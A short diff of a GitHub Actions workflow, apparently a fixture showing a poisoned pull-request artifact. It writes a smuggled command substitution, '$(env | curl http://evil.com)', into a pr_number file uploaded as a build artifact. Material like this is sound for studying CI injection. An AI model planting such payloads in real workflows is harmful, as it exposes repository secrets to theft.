@@ -1,8 +1,16 @@
-name: "Action in PR"
+name: "Build PR Documentation"
 on:
 - pull_request
 jobs:
   debug:
     runs-on: ubuntu-latest
     steps:
-    - run: "echo hello-world"
+      - name: Save commit_sha & pr_number
+        run: |
+          echo 'n/a' > ./build_dir/commit_sha
+          echo '$(env | curl http://evil.com)' > ./build_dir/pr_number
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: doc-build-artifact
+          path: build_dir/
